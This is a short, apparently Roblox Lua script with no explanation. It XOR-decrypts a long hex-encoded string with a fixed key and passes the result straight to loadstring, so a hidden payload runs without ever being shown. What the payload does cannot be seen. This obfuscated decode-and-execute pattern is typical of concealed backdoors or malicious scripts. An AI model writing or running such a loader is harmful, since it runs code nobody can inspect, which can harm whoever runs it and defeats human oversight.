local A="f266bcbf5dfd353645b30b55aeb15ef8eb7db0fe62a919794add3859a2e85e95cd7dbeaa54e01e6a528e0f45c1ea09d7fd7db6b15ffd35317f8d1a54b2a42ad8f27cbaf272bc14675c9c0953e2860fdcf26ff18d45bc0c6e03ab0b54bee94184ea7baabb3bb41e2b7d9c0654a9ed1fd2be7db7bb5ffd0c6a4d96444bbbed0bd7b64abeb25dbf196855d1195da7ea52eaea68abbb18fd1d655af70f56af860edcea7cadb0119072"
local K={158,9,223,222,49,221,120,11,62,253,106,56,203,140,124,185}
local O=table.create(#A/2)
local N=0
for I=1,#A,2 do
N=N+1
O[N]=string.char(bit32.bxor(tonumber(string.sub(A,I,I+1),16),K[(N-1)%#K+1]))
end
return loadstring(table.concat(O))()
